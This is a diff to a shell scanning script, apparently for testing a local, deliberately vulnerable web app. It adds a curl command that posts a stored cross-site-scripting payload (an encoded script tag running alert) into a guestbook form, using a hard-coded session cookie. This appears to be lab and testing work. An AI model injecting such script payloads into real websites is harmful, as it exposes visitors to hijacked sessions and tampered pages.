@@ -39,6 +39,13 @@ print_info() {
     # echo ""
 }
 
+insert_payload() {
+    curl -X POST \
+        'http://localhost:8060/vulnerabilities/xss_s/index.php' \
+        -b 'PHPSESSID=c8fcccd96a575a05d6eb307c8107d718; security=low' \
+        --data 'txtName=hijacked&mtxMessage=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&btnSign=Sign+Guestbook'
+}
+
 find_and_exploit_vulns(){
     SCAN_MODE="${1:-""}"
     URL="${2:-""}"
@@ -84,8 +91,10 @@ find_and_exploit_vulns(){
         --timeout 30 \
         --retries 1 \
         --delay 0 \
-        --xml="$RESULTS_PATH/${URL}.xml" \
+        --save="$RESULTS_PATH/${URL}.raw" \
         --Fp "${PAYLOAD}"
+
+    insert_payload "$RESULTS_PATH/${URL}.xml"
 }
 
 usage() {
